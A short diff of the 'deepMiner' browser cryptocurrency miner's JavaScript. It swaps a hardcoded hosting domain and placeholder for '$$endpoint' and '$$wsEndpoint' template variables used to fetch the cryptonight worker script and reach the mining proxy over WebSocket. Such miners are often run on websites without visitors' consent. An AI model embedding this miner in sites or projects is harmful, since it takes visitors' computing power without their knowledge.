@@ -211,7 +211,7 @@
             this._asmjsStatus = "loaded";
             callback()
         }.bind(this), xhr);
-        xhr.open("get", "https://%deepMiner_domain%/worker.js", true);
+        xhr.open("get", "$$endpoint/public/worker.js", true);
         xhr.send()
         if (this._useWASM || this._asmjsStatus === "loaded") {
             callback()
@@ -574,8 +574,8 @@
 })(window);
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
-    LIB_URL: "https://deepminerplus-perimetral.c9users.io:8080/lib/",
-    WEBSOCKET_SHARDS: [["wss://deepminerplus-perimetral.c9users.io:8080/proxy"]],
+    LIB_URL: "$$endpoint/lib/",
+    WEBSOCKET_SHARDS: [["$$wsEndpoint/proxy"]],
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
